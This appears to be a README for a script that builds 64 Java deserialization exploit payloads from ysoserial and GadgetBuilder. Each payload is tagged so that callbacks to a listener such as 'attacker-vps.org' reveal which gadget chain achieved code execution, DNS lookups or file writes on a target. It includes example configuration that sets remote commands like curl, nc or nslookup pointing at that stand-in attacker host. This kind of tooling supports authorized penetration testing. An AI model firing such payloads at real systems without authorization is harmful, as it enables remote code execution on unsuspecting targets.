# GadgetBuilder + Ysoserial Payload Generator

Generate a full suite of Java deserialization payloads from [GadgetBuilder](https://github.com/software-engineering-and-security/gadgetbuilder) (chains1 + chains2) and [ysoserial](https://github.com/frohoff/ysoserial), ready to use in your web proxy / deserialization scanner.

Every payload is tagged with a **unique ID**, so when a target phones home you instantly know **which gadget chain worked**.

## ✨ Features

- **64 payloads** — one per gadget chain (RCE, DNS, SSRF, JNDI, JRMP, LoadClass, file write…)
- **Payload identification** — each payload calls `<ID>.<Collaborator>`; `callback-map.txt` maps ID → chain
- **Custom RCE command** — `curl`, `wget`, `ping`, `nslookup`, `nc`, or any custom binary
- **Portable** — runs in Docker (JDK 8), all dependencies kept in the project folder (no `/tmp`)
- **Configurable** — collaborator, port, command, output names set at the top of the script

## 📋 Requirements

- Docker (pulls `eclipse-temurin:8-jdk`)
- Internet access (first run downloads the jars from GitHub)
- A callback listener with wildcard DNS, e.g. Burp Collaborator or your own VPS (`*.attacker-vps.org` → your IP)

## 🚀 Quick start

```bash
./GadgetBuilder_Ysoserial_PayloadsGenerator.sh
```

On the first run the script downloads:

- `ysoserial-all.jar` (v0.0.6)
- `gadgetbuilder-1.3.0.jar` (release, 56 chains1)
- `gadgetbuilder-full-1.3.0.jar` (chains1 + chains2) — already present if you cloned the repo with `jars/`

into the `jars/` folder. No other setup is needed.

## ⚙️ Configuration

Edit the `CONFIGURATION` block at the top of `GadgetBuilder_Ysoserial_PayloadsGenerator.sh`:

| Variable | Default | Description |
| --- | --- | --- |
| `Collaborator` | Burp Collaborator host | Callback domain. `<ID>.<Collaborator>` must resolve to your listener |
| `Port` | `8000` | TCP port for JNDI / JRMP / LoadClass chains |
| `RCE_CMD` | `curl %C` | Command for RCE chains. `%C` = `<ID>.<Collaborator>`, `%P` = `Port`, `%N` = bare ID |
| `OUTFILE` / `MAPFILE` | `payloads.inc` / `callback-map.txt` | Output file names |

Example:

```bash
Collaborator="attacker-vps.org"
Port="4444"
RCE_CMD="nslookup %C"
```

## 🎯 How to know a payload worked

`callback-map.txt` tells you the callback address of every payload:

```
37  Clojure2  RCE (curl %C)  37.hufzwo32omf8ss00d9dyayy18sej29qy.oastify.com
```

Watch your listener logs:

| Callback seen | Meaning |
| --- | --- |
| `01.<Collab>` HTTP GET | `BeanShell1` executed your command |
| `44.<Collab>` DNS query | `URLDNS` deserialized |
| `39.<Collab>:8000` connection | `C3P0` attempted to load a class |
| `49.<Collab>:8000` JNDI/RMI | `JRMPClient` / JNDI chains connected |

Payloads with no network callback (e.g. `AspectJWeaver`, `FileUpload1`) write a file on the target instead.

## 🔬 Adding chains2 (optional)

If `jars/gadgetbuilder-full-1.3.0.jar` is missing, the script falls back to the release jar (56 chains1). To build the full jar (chains1 + chains2 + ysoserial extras = 64 payloads) from source:

```bash
BUILD_CHAINS2=1 ./GadgetBuilder_Ysoserial_PayloadsGenerator.sh
```

This clones GadgetBuilder v1.3.0 and compiles `chains2` using a Maven Docker image. The build artifacts stay in `.work/`.

## 📁 Project structure

```
.
├── GadgetBuilder_Ysoserial_PayloadsGenerator.sh   # main script
├── README.md
├── jars/                                          # downloaded / prebuilt jars
│   ├── ysoserial-all.jar
│   ├── gadgetbuilder-1.3.0.jar
│   └── gadgetbuilder-full-1.3.0.jar               # (optional, prebuilt)
├── .work/                                         # generated scripts + build files (regenerable)
├── payloads.inc                                   # one base64 payload per line (ID == line number)
└── callback-map.txt                               # ID → chain mapping
```
